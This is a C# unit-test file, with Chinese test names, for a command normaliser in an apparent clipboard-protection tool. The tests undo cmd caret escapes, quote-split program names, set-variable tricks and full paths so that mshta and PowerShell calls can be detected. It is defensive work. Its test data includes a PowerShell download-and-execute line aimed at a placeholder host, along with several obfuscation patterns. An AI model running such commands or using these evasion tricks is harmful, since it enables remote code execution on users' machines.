using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

// 程式名稱用片段組合（docs/detection-rules.md §8），避免測試檔本身被防毒當成惡意樣本。
public class CommandNormalizerTests
{
    private static readonly string Hta = string.Concat("ms", "hta");
    private static readonly string Ps = string.Concat("power", "shell");
    private static readonly string Pwsh = string.Concat("pw", "sh");

    [Fact]
    public void 各種dash變體換成連字號()
    {
        Assert.Equal("----------", CommandNormalizer.Normalize("\u2010\u2011\u2012\u2013\u2014\u2015\u2212\uFE58\uFE63\uFF0D"));
    }

    [Fact]
    public void 去掉cmd的插入號跳脫()
    {
        Assert.Equal(Hta, CommandNormalizer.Normalize("m^s^h^t^a"));
        Assert.Equal("a^b", CommandNormalizer.Normalize("a^^b"));
        Assert.Equal(Hta, CommandNormalizer.Normalize("ms^\r\nhta"));   // 行尾 ^ 接下一行
    }

    [Theory]
    [InlineData("\"m\"sh\"ta\"")]
    [InlineData("ms\"\"hta")]
    [InlineData("\"ms\"hta")]
    [InlineData("m\"sht\"a")]
    public void 合併用引號拆開的字(string split)
    {
        Assert.Equal(Hta, CommandNormalizer.Normalize(split));
    }

    [Fact]
    public void 代入set設定的變數()
    {
        Assert.Equal($"set x={Hta}&& call {Hta} u", CommandNormalizer.Normalize($"set x={Hta}&& call %x% u"));
        Assert.Equal($"set \"x={Hta}\" & call {Hta} u", CommandNormalizer.Normalize($"set \"x={Hta}\" & call %X% u"));
        Assert.Equal($"set x=ms&set y=hta&call {Hta} u", CommandNormalizer.Normalize("set x=ms&set y=hta&call %x%%y% u"));
    }

    [Fact]
    public void 變數代入有上限()
    {
        var text = "set a=" + new string('x', 1000) + "&" + string.Concat(Enumerable.Repeat("%a%", 1000));
        Assert.True(CommandNormalizer.Normalize(text).Length < 70_000);
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\{0}.exe u", "{0} u")]
    [InlineData(@"c:\windows\syswow64\{0} u", "{0} u")]
    [InlineData(@"""C:\Windows\System32\{0}.exe"" u", "{0} u")]
    [InlineData(@"%SystemRoot%\System32\{0}.exe u", "{0} u")]
    [InlineData(@"%windir%\SysWOW64\{0}.exe u", "{0} u")]
    [InlineData(@"""%windir%\System32\{0}.exe"" u", "{0} u")]
    [InlineData(@"C:/Windows/System32/{0}.exe u", "{0} u")]
    [InlineData(@"\\host\share\{0}.exe u", "{0} u")]
    [InlineData(@"start """" ""{0}"" u", @"start """" {0} u")]
    public void 完整路徑只留程式名稱(string format, string expected)
    {
        Assert.Equal(string.Format(expected, Hta), CommandNormalizer.Normalize(string.Format(format, Hta)));
    }

    [Fact]
    public void PowerShell的各種路徑()
    {
        Assert.Equal($"{Ps} -c x", CommandNormalizer.Normalize($@"C:\Windows\System32\WindowsPowerShell\v1.0\{Ps}.exe -c x"));
        Assert.Equal($"{Ps} -c x", CommandNormalizer.Normalize($@"$env:windir\SysWOW64\WindowsPowerShell\v1.0\{Ps}.exe -c x"));
        Assert.Equal($"{Pwsh} -c x", CommandNormalizer.Normalize($@"""C:\Program Files\PowerShell\7\{Pwsh}.exe"" -c x"));
        Assert.Equal($"{Pwsh} -c x", CommandNormalizer.Normalize($@"""%ProgramFiles%\PowerShell\7\{Pwsh}.exe"" -c x"));
        Assert.Equal("cmd /c x", CommandNormalizer.Normalize("%ComSpec% /c x"));
    }

    // 不該被改動的文字：一般路徑、網址、字串參數、未知變數。
    [Theory]
    [InlineData(@"C:\x\a.ps1")]
    [InlineData(@"C:\Windows\System32\")]
    [InlineData("github.com/powershell/powershell")]
    [InlineData("https://example.invalid/tools/mshta.exe")]
    [InlineData(@"powershell -c ""irm https://example.invalid | iex""")]
    [InlineData("%UNKNOWN%")]
    [InlineData("echo \"hello\" world")]
    [InlineData("明天下午三點開會")]
    public void 其他文字保持原樣(string text)
    {
        Assert.Equal(text, CommandNormalizer.Normalize(text));
    }

    [Fact]
    public void 字串參數裡的路徑只縮短路徑本身()
    {
        // 加引號的路徑規則不能把整段 -c "…" 吃掉，只有裡面那個路徑會縮成檔名。
        Assert.Equal(@"x -c ""Get-Item cmd""", CommandNormalizer.Normalize(@"x -c ""Get-Item C:\x\cmd"""));
    }

    [Fact]
    public void 空字串()
    {
        Assert.Equal("", CommandNormalizer.Normalize(null));
        Assert.Equal("", CommandNormalizer.Normalize(""));
    }
}
